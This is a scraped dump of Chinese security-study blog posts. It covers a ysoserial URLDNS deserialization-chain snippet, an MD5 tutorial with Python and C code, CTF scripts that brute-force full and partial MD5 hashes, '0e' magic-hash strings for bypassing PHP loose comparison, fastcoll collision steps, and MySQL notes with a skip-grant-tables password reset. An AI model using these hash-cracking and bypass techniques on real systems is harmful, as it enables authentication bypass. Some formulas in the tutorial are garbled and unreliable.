如果我们传入的handler为自己改写的，且getHostAddress()返回空 static class SilentURLStreamHandler extends URLStreamHandler { protected URLConnection openConnection(URL u) throws IOException { return null; } protected synchronized InetAddress getHostAddress(URL u) { return null; }} 那我们在put的时候，调入getHostAddress()的时候就不会发送请求。那么为什么在反序列化的时候会有请求呢，因为之前说过序列化和反序列化只记录类的属性，而函数内容不管，这是为什么pop链能构造起来。卧槽这个作者是把java源码吃肚子里了么。不得不佩服，大佬的代码炫酷而不失优雅","link":"2020/05/29/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A83-ysoserial%E8%B0%83%E8%AF%95%E5%92%8C%E6%9E%84%E9%80%A0URLDNS%E7%9A%84pop%E9%93%BE/"},{"title":"md5算法的学习和c/python3的实现","text":"MD5算法分析MD5算法底层原理：简单概括起来，MD5算法的过程分为四步：处理原文，设置初始值，循环加工，拼接结果。 第一步:处理原文 首先，我们计算出原文长度(bit)对512求余的结果，如果不等于448，就需要填充原文使得原文对512求余的结果等于448。填充的方法是第一位填充1，其余位填充0。填充完后，信息的长度就是512*N+448。 之后，用剩余的位置（512-448=64位）记录原文的真正长度，把长度的二进制值补在最后。这样处理后的信息长度就是512*(N+1)。举例：消息内容为“gnubd”，就能得到以下内容 67 6E 62 75 64 80 00 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 28 00 00 00 00 00 00 00 注意到最后面这里有个0x28，数8个字节，就是0x0000000000000028，刚刚好是十进制的40，消息的内容是5个字节，也就是40位，还要注意到这里是小端字节序存储第二步:设置初始值 MD5的哈希结果长度为128位，按每32位分成一组共4组。这4组结果是由4个初始值A、B、C、D经过不断演变得到。MD5的官方实现中，A、B、C、D的初始值如下（16进制）： A=0x01234567B=0x89ABCDEFC=0xFEDCBA98D=0x76543210 第三步:循环加工 这一步是最复杂的一步，我们看看下面这张图，此图代表了单次A,B,C,D值演变的流程。 图中，A，B，C，D就是哈希值的四个分组。每一次循环都会让旧的ABCD产生新的ABCD。一共进行多少次循环呢？由处理后的原文长度决定。 假设处理后的原文长度是M 主循环次数 = M / 512 每个主循环中包含 512 / 32 * 4 = 64 次 子循环。 上面这张图所表达的就是单次子循环的流程。 下面对图中其他元素一一解释： 1.绿色F 图中的绿色F，代表非线性函数。官方MD5所用到的函数有四种： F(X, Y, Z) =(X&amp;Y) | ((~X) &amp; Z)G(X, Y, Z) =(X&amp;Z) | (Y &amp; (~Z))H(X, Y, Z) =X^Y^ZI(X, Y, Z)=Y^(X|(~Z)) 在主循环下面64次子循环中，F、G、H、I 交替使用，第一个16次使用F，第二个16次使用G，第三个16次使用H，第四个16次使用I。 2.红色“田”字 很简单，红色的田字代表相加的意思。 3.Mi Mi是第一步处理后的原文。在第一步中，处理后原文的长度是512的整数倍。把原文的每512位再分成16等份，命名为M0M15，每一等份长度32。在64次子循环中，每16次循环，都会交替用到M1M16之一。 4、Ki 一个常量，在64次子循环中，每一次用到的常量都是不同的。 5.黄色的&lt;&lt;&lt; 左移S位，S的值也是常量。 “流水线”的最后，让计算的结果和B相加，取代原先的B。新ABCD的产生可以归纳为： 新A = 原d 新B = b+((a+F(b,c,d)+Mj+Ki)&lt;&gt; 新C = 原b 新D = 原c 总结一下主循环中的64次子循环，可以归纳为下面的四部分： 第一轮： FF(a,b,c,d,M0,7,0xd76aa478） s[0]=7, K[0] = 0xd76aa478FF(a,b,c,d,M1,12,0xe8c7b756） s[1]=12, K[1] = 0xe8c7b756FF(a,b,c,d,M2,17,0x242070db)FF(a,b,c,d,M3,22,0xc1bdceee)FF(a,b,c,d,M4,7,0xf57c0faf)FF(a,b,c,d,M5,12,0x4787c62a)FF(a,b,c,d,M6,17,0xa8304613）FF(a,b,c,d,M7,22,0xfd469501）FF(a,b,c,d,M8,7,0x698098d8）FF(a,b,c,d,M9,12,0x8b44f7af)FF(a,b,c,d,M10,17,0xffff5bb1）FF(a,b,c,d,M11,22,0x895cd7be)FF(a,b,c,d,M12,7,0x6b901122）FF(a,b,c,d,M13,12,0xfd987193）FF(a,b,c,d,M14,17, 0xa679438e)FF(a,b,c,d,M15,22,0x49b40821） 第二轮： GG(a,b,c,d,M1,5,0xf61e2562）GG(a,b,c,d,M6,9,0xc040b340）GG(a,b,c,d,M11,14,0x265e5a51）GG(a,b,c,d,M0,20,0xe9b6c7aa)GG(a,b,c,d,M5,5,0xd62f105d)GG(a,b,c,d,M10,9,0x02441453）GG(a,b,c,d,M15,14,0xd8a1e681）GG(a,b,c,d,M4,20,0xe7d3fbc8）GG(a,b,c,d,M9,5,0x21e1cde6）GG(a,b,c,d,M14,9,0xc33707d6）GG(a,b,c,d,M3,14,0xf4d50d87）GG(a,b,c,d,M8,20,0x455a14ed)GG(a,b,c,d,M13,5,0xa9e3e905）GG(a,b,c,d,M2,9,0xfcefa3f8）GG(a,b,c,d,M7,14,0x676f02d9）GG(a,b,c,d,M12,20,0x8d2a4c8a) 第三轮： HH(a,b,c,d,M5,4,0xfffa3942）HH(a,b,c,d,M8,11,0x8771f681）HH(a,b,c,d,M11,16,0x6d9d6122）HH(a,b,c,d,M14,23,0xfde5380c)HH(a,b,c,d,M1,4,0xa4beea44）HH(a,b,c,d,M4,11,0x4bdecfa9）HH(a,b,c,d,M7,16,0xf6bb4b60）HH(a,b,c,d,M10,23,0xbebfbc70）HH(a,b,c,d,M13,4,0x289b7ec6）HH(a,b,c,d,M0,11,0xeaa127fa)HH(a,b,c,d,M3,16,0xd4ef3085）HH(a,b,c,d,M6,23,0x04881d05）HH(a,b,c,d,M9,4,0xd9d4d039）HH(a,b,c,d,M12,11,0xe6db99e5）HH(a,b,c,d,M15,16,0x1fa27cf8）HH(a,b,c,d,M2,23,0xc4ac5665） 第四轮： Ⅱ（a,b,c,d,M0,6,0xf4292244）Ⅱ（a,b,c,d,M7,10,0x432aff97）Ⅱ（a,b,c,d,M14,15,0xab9423a7）Ⅱ（a,b,c,d,M5,21,0xfc93a039）Ⅱ（a,b,c,d,M12,6,0x655b59c3）Ⅱ（a,b,c,d,M3,10,0x8f0ccc92）Ⅱ（a,b,c,d,M10,15,0xffeff47d)Ⅱ（a,b,c,d,M1,21,0x85845dd1）Ⅱ（a,b,c,d,M8,6,0x6fa87e4f)Ⅱ（a,b,c,d,M15,10,0xfe2ce6e0)Ⅱ（a,b,c,d,M6,15,0xa3014314）Ⅱ（a,b,c,d,M13,21,0x4e0811a1）Ⅱ（a,b,c,d,M4,6,0xf7537e82）Ⅱ（a,b,c,d,M11,10,0xbd3af235）Ⅱ（a,b,c,d,M2,15,0x2ad7d2bb)Ⅱ（a,b,c,d,M9,21,0xeb86d391） 第四步:拼接结果 这一步就很简单了，把循环加工最终产生的A，B，C，D四个值拼接在一起，转换成字符串即可。 简单实现 python3版本#!/usr/bin/python3# MD5 实现及其验证import mathrotate_amounts = [7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22, 5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20, 4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23, 6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21]constants = [int(abs(math.sin(i+1)) * 2**32) &amp; 0xFFFFFFFF for i in range(64)]# A B C Dinit_values = [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476]# 非线性函数functions = 16*[lambda b, c, d: (b &amp; c) | (~b &amp; d)] + \\ 16*[lambda b, c, d: (d &amp; b) | (~d &amp; c)] + \\ 16*[lambda b, c, d: b ^ c ^ d] + \\ 16*[lambda b, c, d: c ^ (b | ~d)]index_functions = 16*[lambda i: i] + \\ 16*[lambda i: (5*i + 1)%16] + \\ 16*[lambda i: (3*i + 5)%16] + \\ 16*[lambda i: (7*i)%16]# 对x左移amount位def left_rotate(x, amount): x &amp;= 0xFFFFFFFF return ((x&lt;&lt;amount) | (x&gt;&gt;(32-amount))) &amp; 0xFFFFFFFFdef md5(message): message = bytearray(message) #copy our input into a mutable buffer orig_len_in_bits = (8 * len(message)) &amp; 0xffffffffffffffff message.append(0x80) while len(message)%64 != 56: message.append(0) message += orig_len_in_bits.to_bytes(8, byteorder=&apos;little&apos;) hash_pieces = init_values[:] for chunk_ofst in range(0, len(message), 64): a, b, c, d = hash_pieces chunk = message[chunk_ofst:chunk_ofst+64] for i in range(64): f = functions[i](b, c, d) g = index_functions[i](i) to_rotate = a + f + constants[i] + int.from_bytes(chunk[4*g:4*g+4], byteorder=&apos;little&apos;) new_b = (b + left_rotate(to_rotate, rotate_amounts[i])) &amp; 0xFFFFFFFF a, b, c, d = d, new_b, b, c for i, val in enumerate([a, b, c, d]): hash_pieces[i] += val hash_pieces[i] &amp;= 0xFFFFFFFF return sum(x&lt;&lt;(32*i) for i, x in enumerate(hash_pieces))def md5_to_hex(digest): raw = digest.to_bytes(16, byteorder=&apos;little&apos;) return &apos;{:032x}&apos;.format(int.from_bytes(raw, byteorder=&apos;big&apos;))def my_md5(message): return md5_to_hex(md5(message))if __name__==&apos;__main__&apos;: demo = b&quot;123&quot; print(&apos;&quot;&apos;,demo.decode(&apos;ascii&apos;),&apos;&quot; =&gt; &quot;&apos;,my_md5(demo),&apos;&quot;&apos;, sep=&apos;&apos;) C语言版本版本#include &lt;string.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;/*md5转换用到的常量，算法本身规定的*/#define S11 7#define S12 12#define S13 17#define S14 22#define S21 5#define S22 9#define S23 14#define S24 20#define S31 4#define S32 11#define S33 16#define S34 23#define S41 6#define S42 10#define S43 15#define S44 21#define R_memset(x, y, z) memset(x, y, z)#define R_memcpy(x, y, z) memcpy(x, y, z)#define R_memcmp(x, y, z) memcmp(x, y, z)typedef unsigned long UINT4;typedef unsigned char *POINTER;/* MD5 context. */typedef struct { /* state (ABCD) */ /*四个32bits数，用于存放最终计算得到的消息摘要。当消息长度〉512bits时，也用于存放每个512bits的中间结果*/ UINT4 state[4]; /* number of bits, modulo 2^64 (lsb first) */ /*存储原始信息的bits数长度,不包括填充的bits，最长为 2^64 bits，因为2^64是一个64位数的最大值*/ UINT4 count[2]; /* input buffer */ /*存放输入的信息的缓冲区，512bits*/ unsigned char buffer[64];} MD5_CTX;void MD5Init(MD5_CTX *);void MD5Update(MD5_CTX *, unsigned char *, unsigned int);void MD5Final(unsigned char [16], MD5_CTX *);static void MD5Transform(UINT4 [4], unsigned char [64]);static void Encode(unsigned char *, UINT4 *, unsigned int);static void Decode(UINT4 *, unsigned char *, unsigned int);/*用于bits填充的缓冲区，为什么要64个字节呢？因为当欲加密的信息的bits数被512除其余数为448时，需要填充的bits的最大值为512=64*8 。*/static unsigned char PADDING[64] = { 0x80, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};/*接下来的这几个宏定义是md5算法规定的，就是对信息进行md5加密都要做的运算。据说有经验的高手跟踪程序时根据这几个特殊的操作就可以断定是不是用的md5*//* F, G, H and I are basic MD5 functions. */#define F(x, y, z) (((x) &amp; (y)) | ((~x) &amp; (z)))#define G(x, y, z) (((x) &amp; (z)) | ((y) &amp; (~z)))#define H(x, y, z) ((x) ^ (y) ^ (z))#define I(x, y, z) ((y) ^ ((x) | (~z)))/* ROTATE_LEFT rotates x left n bits. */#define ROTATE_LEFT(x, n) (((x) &lt;&lt; (n)) | ((x) &gt;&gt; (32-(n))))/* FF, GG, HH, and II transformations for rounds 1, 2, 3, and 4. Rotation is separate from addition to prevent recomputation. */#define FF(a, b, c, d, x, s, ac) { (a) += F ((b), (c), (d)) + (x) + (UINT4)(ac); (a) = ROTATE_LEFT ((a), (s)); (a) += (b); }#define GG(a, b, c, d, x, s, ac) { (a) += G ((b), (c), (d)) + (x) + (UINT4)(ac); (a) = ROTATE_LEFT ((a), (s)); (a) += (b); }#define HH(a, b, c, d, x, s, ac) { (a) += H ((b), (c), (d)) + (x) + (UINT4)(ac); (a) = ROTATE_LEFT ((a), (s)); (a) += (b); }#define II(a, b, c, d, x, s, ac) { (a) += I ((b), (c), (d)) + (x) + (UINT4)(ac); (a) = ROTATE_LEFT ((a), (s)); (a) += (b); }/* MD5 initialization. Begins an MD5 operation, writing a new context. *//*初始化md5的结构*/void MD5Init (MD5_CTX *context){ /*将当前的有效信息的长度设成0,这个很简单,还没有有效信息,长度当然是0了*/ context-&gt;count[0] = context-&gt;count[1] = 0; /* Load magic initialization constants.*/ /*初始化链接变量，算法要求这样，这个没法解释了*/ context-&gt;state[0] = 0x67452301; context-&gt;state[1] = 0xefcdab89; context-&gt;state[2] = 0x98badcfe; context-&gt;state[3] = 0x10325476;}/* MD5 block update operation. Continues an MD5 message-digest operation, processing another message block, and updating the context. *//*将与加密的信息传递给md5结构，可以多次调用context：初始化过了的md5结构input：欲加密的信息，可以任意长inputLen：指定input的长度*/void MD5Update(MD5_CTX *context,unsigned char * input,unsigned int inputLen){ unsigned int i, index, partLen; /* Compute number of bytes mod 64 */ /*计算已有信息的bits长度的字节数的模64, 64bytes=512bits。 用于判断已有信息加上当前传过来的信息的总长度能不能达到512bits， 如果能够达到则对凑够的512bits进行一次处理*/ index = (unsigned int)((context-&gt;count[0] &gt;&gt; 3) &amp; 0x3F); /* Update number of bits *//*更新已有信息的bits长度*/ if((context-&gt;count[0] += ((UINT4)inputLen &lt;&lt; 3)) &lt; ((UINT4)inputLen &lt;&lt; 3)) context-&gt;count[1]++; context-&gt;count[1] += ((UINT4)inputLen &gt;&gt; 29); /*计算已有的字节数长度还差多少字节可以 凑成64的整倍数*/ partLen = 64 - index; /* Transform as many times as possible. */ /*如果当前输入的字节数 大于 已有字节数长度补足64字节整倍数所差的字节数*/ if(inputLen &gt;= partLen) { /*用当前输入的内容把context-&gt;buffer的内容补足512bits*/ R_memcpy((POINTER)&amp;context-&gt;buffer[index], (POINTER)input, partLen); /*用基本函数对填充满的512bits（已经保存到context-&gt;buffer中） 做一次转换，转换结果保存到context-&gt;state中*/ MD5Transform(context-&gt;state, context-&gt;buffer); /* 对当前输入的剩余字节做转换（如果剩余的字节&lt;在输入的input缓冲区中&gt;大于512bits的话 ）， 转换结果保存到context-&gt;state中 */ for(i = partLen; i + 63 &lt; inputLen; i += 64 )/*把i+63&lt;inputlen改为i+64&lt;=inputlen更容易理解*/ MD5Transform(context-&gt;state, &amp;input[i]); index = 0; } else i = 0; /* Buffer remaining input */ /*将输入缓冲区中的不足填充满512bits的剩余内容填充到context-&gt;buffer中，留待以后再作处理*/ R_memcpy((POINTER)&amp;context-&gt;buffer[index], (POINTER)&amp;input[i], inputLen-i);}/* MD5 finalization. Ends an MD5 message-digest operation, writing the the message digest and zeroizing the context. *//*获取加密 的最终结果digest：保存最终的加密串context：你前面初始化并填入了信息的md5结构*/void MD5Final (unsigned char digest[16],MD5_CTX *context){ unsigned char bits[8]; unsigned int index, padLen; /* Save number of bits */ /*将要被转换的信息(所有的)的bits长度拷贝到bits中*/ Encode(bits, context-&gt;count, 8); /* Pad out to 56 mod 64. */ /* 计算所有的bits长度的字节数的模64, 64bytes=512bits*/ index = (unsigned int)((context-&gt;count[0] &gt;&gt; 3) &amp; 0x3f); /*计算需要填充的字节数，padLen的取值范围在1-64之间*/ padLen = (index &lt; 56) ? (56 - index) : (120 - index); /*这一次函数调用绝对不会再导致MD5Transform的被调用，因为这一次不会填满512bits*/ MD5Update(context, PADDING, padLen); /* Append length (before padding) */ /*补上原始信息的bits长度（bits长度固定的用64bits表示），这一次能够恰巧凑够512bits，不会多也不会少*/ MD5Update(context, bits, 8); /* Store state in digest */ /*将最终的结果保存到digest中。ok，终于大功告成了*/ Encode(digest, context-&gt;state, 16); /* Zeroize sensitive information. */ R_memset((POINTER)context, 0, sizeof(*context));}/* MD5 basic transformation. Transforms state based on block. *//*对512bits信息(即block缓冲区)进行一次处理，每次处理包括四轮state[4]：md5结构中的state[4]，用于保存对512bits信息加密的中间结果或者最终结果block[64]：欲加密的512bits信息*/static void MD5Transform (UINT4 state[4], unsigned char block[64]){ UINT4 a = state[0], b = state[1], c = state[2], d = state[3], x[16]; Decode(x, block, 64); /* Round 1 */ FF(a, b, c, d, x[ 0], S11, 0xd76aa478); /* 1 */ FF(d, a, b, c, x[ 1], S12, 0xe8c7b756); /* 2 */ FF(c, d, a, b, x[ 2], S13, 0x242070db); /* 3 */ FF(b, c, d, a, x[ 3], S14, 0xc1bdceee); /* 4 */ FF(a, b, c, d, x[ 4], S11, 0xf57c0faf); /* 5 */ FF(d, a, b, c, x[ 5], S12, 0x4787c62a); /* 6 */ FF(c, d, a, b, x[ 6], S13, 0xa8304613); /* 7 */ FF(b, c, d, a, x[ 7], S14, 0xfd469501); /* 8 */ FF(a, b, c, d, x[ 8], S11, 0x698098d8); /* 9 */ FF(d, a, b, c, x[ 9], S12, 0x8b44f7af); /* 10 */ FF(c, d, a, b, x[10], S13, 0xffff5bb1); /* 11 */ FF(b, c, d, a, x[11], S14, 0x895cd7be); /* 12 */ FF(a, b, c, d, x[12], S11, 0x6b901122); /* 13 */ FF(d, a, b, c, x[13], S12, 0xfd987193); /* 14 */ FF(c, d, a, b, x[14], S13, 0xa679438e); /* 15 */ FF(b, c, d, a, x[15], S14, 0x49b40821); /* 16 */ /* Round 2 */ GG(a, b, c, d, x[ 1], S21, 0xf61e2562); /* 17 */ GG(d, a, b, c, x[ 6], S22, 0xc040b340); /* 18 */ GG(c, d, a, b, x[11], S23, 0x265e5a51); /* 19 */ GG(b, c, d, a, x[ 0], S24, 0xe9b6c7aa); /* 20 */ GG(a, b, c, d, x[ 5], S21, 0xd62f105d); /* 21 */ GG(d, a, b, c, x[10], S22, 0x2441453); /* 22 */ GG(c, d, a, b, x[15], S23, 0xd8a1e681); /* 23 */ GG(b, c, d, a, x[ 4], S24, 0xe7d3fbc8); /* 24 */ GG(a, b, c, d, x[ 9], S21, 0x21e1cde6); /* 25 */ GG(d, a, b, c, x[14], S22, 0xc33707d6); /* 26 */ GG(c, d, a, b, x[ 3], S23, 0xf4d50d87); /* 27 */ GG(b, c, d, a, x[ 8], S24, 0x455a14ed); /* 28 */ GG(a, b, c, d, x[13], S21, 0xa9e3e905); /* 29 */ GG(d, a, b, c, x[ 2], S22, 0xfcefa3f8); /* 30 */ GG(c, d, a, b, x[ 7], S23, 0x676f02d9); /* 31 */ GG(b, c, d, a, x[12], S24, 0x8d2a4c8a); /* 32 */ /* Round 3 */ HH(a, b, c, d, x[ 5], S31, 0xfffa3942); /* 33 */ HH(d, a, b, c, x[ 8], S32, 0x8771f681); /* 34 */ HH(c, d, a, b, x[11], S33, 0x6d9d6122); /* 35 */ HH(b, c, d, a, x[14], S34, 0xfde5380c); /* 36 */ HH(a, b, c, d, x[ 1], S31, 0xa4beea44); /* 37 */ HH(d, a, b, c, x[ 4], S32, 0x4bdecfa9); /* 38 */ HH(c, d, a, b, x[ 7], S33, 0xf6bb4b60); /* 39 */ HH(b, c, d, a, x[10], S34, 0xbebfbc70); /* 40 */ HH(a, b, c, d, x[13], S31, 0x289b7ec6); /* 41 */ HH(d, a, b, c, x[ 0], S32, 0xeaa127fa); /* 42 */ HH(c, d, a, b, x[ 3], S33, 0xd4ef3085); /* 43 */ HH(b, c, d, a, x[ 6], S34, 0x4881d05); /* 44 */ HH(a, b, c, d, x[ 9], S31, 0xd9d4d039); /* 45 */ HH(d, a, b, c, x[12], S32, 0xe6db99e5); /* 46 */ HH(c, d, a, b, x[15], S33, 0x1fa27cf8); /* 47 */ HH(b, c, d, a, x[ 2], S34, 0xc4ac5665); /* 48 */ /* Round 4 */ II(a, b, c, d, x[ 0], S41, 0xf4292244); /* 49 */ II(d, a, b, c, x[ 7], S42, 0x432aff97); /* 50 */ II(c, d, a, b, x[14], S43, 0xab9423a7); /* 51 */ II(b, c, d, a, x[ 5], S44, 0xfc93a039); /* 52 */ II(a, b, c, d, x[12], S41, 0x655b59c3); /* 53 */ II(d, a, b, c, x[ 3], S42, 0x8f0ccc92); /* 54 */ II(c, d, a, b, x[10], S43, 0xffeff47d); /* 55 */ II(b, c, d, a, x[ 1], S44, 0x85845dd1); /* 56 */ II(a, b, c, d, x[ 8], S41, 0x6fa87e4f); /* 57 */ II(d, a, b, c, x[15], S42, 0xfe2ce6e0); /* 58 */ II(c, d, a, b, x[ 6], S43, 0xa3014314); /* 59 */ II(b, c, d, a, x[13], S44, 0x4e0811a1); /* 60 */ II(a, b, c, d, x[ 4], S41, 0xf7537e82); /* 61 */ II(d, a, b, c, x[11], S42, 0xbd3af235); /* 62 */ II(c, d, a, b, x[ 2], S43, 0x2ad7d2bb); /* 63 */ II(b, c, d, a, x[ 9], S44, 0xeb86d391); /* 64 */ state[0] += a; state[1] += b; state[2] += c; state[3] += d; /* Zeroize sensitive information. */ R_memset((POINTER)x, 0, sizeof(x));}/* Encodes input (UINT4) into output (unsigned char). Assumes len is a multiple of 4. *//*将4字节的整数copy到字符形式的缓冲区中output：用于输出的字符缓冲区input：欲转换的四字节的整数形式的数组len：output缓冲区的长度，要求是4的整数倍*/static void Encode(unsigned char *output, UINT4 *input,unsigned int len){ unsigned int i, j; for(i = 0, j = 0; j &lt; len; i++, j += 4) { output[j] = (unsigned char)(input[i] &amp; 0xff); output[j+1] = (unsigned char)((input[i] &gt;&gt; 8) &amp; 0xff); output[j+2] = (unsigned char)((input[i] &gt;&gt; 16) &amp; 0xff); output[j+3] = (unsigned char)((input[i] &gt;&gt; 24) &amp; 0xff); }}/* Decodes input (unsigned char) into output (UINT4). Assumes len is a multiple of 4. *//*与上面的函数正好相反，这一个把字符形式的缓冲区中的数据copy到4字节的整数中（即以整数形式保存）output：保存转换出的整数input：欲转换的字符缓冲区len：输入的字符缓冲区的长度，要求是4的整数倍*/static void Decode(UINT4 *output, unsigned char *input,unsigned int len){ unsigned int i, j; for(i = 0, j = 0; j &lt; len; i++, j += 4) output[i] = ((UINT4)input[j]) | (((UINT4)input[j+1]) &lt;&lt; 8) | (((UINT4)input[j+2]) &lt;&lt; 16) | (((UINT4)input[j+3]) &lt;&lt; 24);}int main(int argc, char* argv[]){ int i; MD5_CTX md5; MD5Init(&amp;md5); //初始化用于md5加密的结构 unsigned char encrypt[1024]; //存放于加密的信息 unsigned char decrypt[17]; //存放加密后的结果 scanf(&quot;%s&quot;,encrypt); //输入加密的字符 MD5Update(&amp;md5,encrypt,strlen((char *)encrypt)); //对欲加密的字符进行加密 MD5Final(decrypt,&amp;md5); //获得最终结果 printf(&quot;加密前:%s\\n加密后:&quot;,encrypt); for(i=0; i&lt;16; i++) { printf(&quot;%02x &quot;,decrypt[i]); } printf(&quot;\\n\\n\\n加密结束!\\n&quot;); system(&quot;pause&quot;); return 0;} MD5的一些脚本爆破28位md5 import stringimport randomimport sysimport hashlibfor i in range(0,111524287): s=&apos;{:028b}&apos;.format(i) #print(s) obj=&quot;&quot; for j in range(0,28): obj=obj+chr(ord(s[j])+1) if(hashlib.md5(obj.encode()).hexdigest()==&apos;39c1ca4b6d64c40558425432c11624a8&apos;): print(s+&quot;break&quot;) break 随机md5爆破 import stringimport randomimport sysimport hashlibwhile True: urllist=&quot;&quot; for i in range(13): urllist=urllist+random.choice([&apos;1&apos;, &apos;2&apos;]) #print(urllist) #print(hashlib.md5(urllist.encode()).hexdigest()) if(hashlib.md5(urllist.encode()).hexdigest()==&apos;39c1ca4b6d64c40558425432c11624a8&apos;): print(urllist+&quot;break&quot;) break md5前几位爆破加盐.py from hashlib import md5allString = &quot;1234567890-_,qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&quot;salt=&quot;f13c&quot;part_hash=&quot;8089a&quot;for i in allString: string=i if(md5((string + salt).encode(&apos;utf-8&apos;)).hexdigest()[:5] == part_hash): print(string)for i in allString: for j in allString: string=i+j #print(string) if(md5((string + salt).encode(&apos;utf-8&apos;)).hexdigest()[:5] == part_hash): print(string)for x in allString: for i in allString: for j in allString: string=x+i+j #print(string) if(md5((string + salt).encode(&apos;utf-8&apos;)).hexdigest()[:5] == part_hash): print(string) exit(0)for m in allString: for x in allString: for i in allString: for j in allString: string=m+x+i+j #print(string) if(md5((string + salt).encode(&apos;utf-8&apos;)).hexdigest()[:5] == part_hash): print(string) #print(part_hash) exit(0) md5前几位爆破不加盐.py from hashlib import md5allString = &quot;1234567890-_,qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&quot;part_hash=&quot;33c2ac&quot;for m in allString: string=m print(string) if(md5(string.encode(&apos;utf-8&apos;)).hexdigest()[:6] == part_hash): print(string) #print(part_hash) exit(0) for m in allString: for x in allString: string=m+x print(string) if(md5(string.encode(&apos;utf-8&apos;)).hexdigest()[:6] == part_hash): print(string) #print(part_hash) exit(0) for m in allString: for x in allString: for i in allString: string=m+x+i print(string) if(md5(string.encode(&apos;utf-8&apos;)).hexdigest()[:6] == part_hash): print(string) #print(part_hash) exit(0) for m in allString: for x in allString: for i in allString: for j in allString: string=m+x+i+j print(string) if(md5(string.encode(&apos;utf-8&apos;)).hexdigest()[:6] == part_hash): print(string) #print(part_hash) exit(0) for m in allString: for x in allString: for i in allString: for j in allString: for a in allString: string=m+x+i+j+a print(string) if(md5(string.encode(&apos;utf-8&apos;)).hexdigest()[:6] == part_hash): print(string) #print(part_hash) exit(0) for m in allString: for x in allString: for i in allString: for j in allString: for a in allString: for b in allString: string=m+x+i+j+a+b print(string) if(md5(string.encode(&apos;utf-8&apos;)).hexdigest()[:6] == part_hash): print(string) #print(part_hash) exit(0) MD5一些碰撞s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904 碰撞得到两个md5一样的文件，使用fastcoll_v1.0.0.5.exe 1.新建一个txt文件，内容为1234562.首先用cmd打开fastcoll_v1.0.0.5.exe -p 1.txt 生成payload文件","link":"2019/11/19/md5%E7%AE%97%E6%B3%95%E7%9A%84%E5%AD%A6%E4%B9%A0%E5%92%8Cc-python3%E7%9A%84%E5%AE%9E%E7%8E%B0/"},{"title":"mysql必知必会","text":"一、目录（整体看一波这本书怎么讲的mysql）第一章——了解SQL第二章——MySQL简介第三章——使用MySQL第四章——检索数据第五章——排序检索数据第六章——过滤数据第七章——数据过滤第八章——用通配符进行过滤第九章——用正则表达式进行搜索第十章——创建计算字段第十一章——使用数据处理函数 第十二章——汇总数据第十三章——分组数据第十四章——使用子查询第十五章——联结表第十六章——创建高级联结第十七章——组合查询第十八章——全文本搜索第十九章——插入数据第二十章——更新和删除数据第二十一章——创建和操纵表第二十二章——使用视图第二十三章——使用储存过程第二十四章——使用游标第二十五章——使用触发器第二十六章——管理事务处理第二十七章——全球化和本地化第二十八章——安全管理第二十九章——数据库维护第三十章——改善性能和正则表达式必知必会一样，出自于(BenForta)福塔大师傅，看起来还是很舒服，除了常规大家使用的几条语句外对于包括联结的使用、子查询、正则表达式和基于全文本的搜索、存储过程、游标、触发器、表约束，等等有详细的描述，完整看下来还是有收获的 二、忘记mysql密码或者初始化如何重置密码的两个方法（是不是很突兀，尴尬主要是遇到太多次了，还是记一下跳过密码登陆直接修改）方法1、 进入dos窗口，停止mysql服务：net stop mysql 进入mysql的安装目录，进入bin目录 mysqld –skip-grant-tables 重新打开一个dos窗口，进入mysql的bin目录 mysql -u root -p 不需要输入密码，直接回车 直接修改密码 update mysql.user set password=PASSWORD(“root”) where User=”root”; flush privileges; 刷新权限 退出dos窗口之后，就可以重新建立mysql连接，用新密码登陆mysql 方法2、 修改本地mysql目录中的my.ini文件（如果没有可自己新建）添加skip-grant-tables 进行mysql的重启启动操作 直接输入mysql -u root -p然后不输入密码直接回车就可以进入数据库执行sql修改root用户的密码：update user set authentication_string = password(“123456”) where user = “root”; 三、大致总结一丢丢第1章 了解SQL数据库：保存有组织的数据的容器（通常是一个文件或一组文件）模式：关于数据库和表的布局及特性信息。主键：一列（或一组列），其值能够唯一区分表中每个行。 表：某种特定类型数据的结构化清单。列：表中的一个字段，所有表都是由一个或多个列组成的。行：表中的一条记录。 第2章 MySQL简介(不区分大小写)在win终端下启动MySQL，不带分号C:\\Users\\Dylan&gt;mysql -u root mysql退出终端，不带分号mysql&gt; quitmysql&gt; exit 推荐使用图形交互的数据库客户端，比如Navicat 第3章 使用MySQLmysql&gt; show databases;返回数据库数据库mysql&gt; use databases_name;选择数据库mysql&gt; show columns from table_name;mysql&gt; describe table_name;返回一个表中各个字段的详细信息。 第4章 检索数据SQL语句以；来结束，可以delimiter来切换。比如用delimiter \\\\来切换为用\\\\来结束。(对于后面函数调用尤其重要) 第5章 排序检索数据如果在多个列上执行降序排序，必须对每个列指定DESC关键字。反之ASC（放在最末尾 select * from table_name order by id DESC(ASC) 第6章 过滤数据通过WHERE子句以及子句操作符来作为过滤条件。 第7章 数据过滤多数语言一样）在处理OR操作符之前，优先处理AND操作符。如下代码： select prod_name, prod_pricefrom productswhere vend_id = 1002 or vend_id = 1003 and prod_price &gt;=10;#它理解为由供应商1003制造的任何价格为10美元（含）以上的产品或者由供应商1002制造的任何产品，而不管其价格如何。 第8章 用通配符进行过滤MySQL在执行匹配时默认不区分大小写。不过，根据配置搜索市可以区分大小写的。LIKE操作符包括两个匹配符%和_，其中%表示任何字符出现任意次数，_只匹配单个字符而不是多个字符。 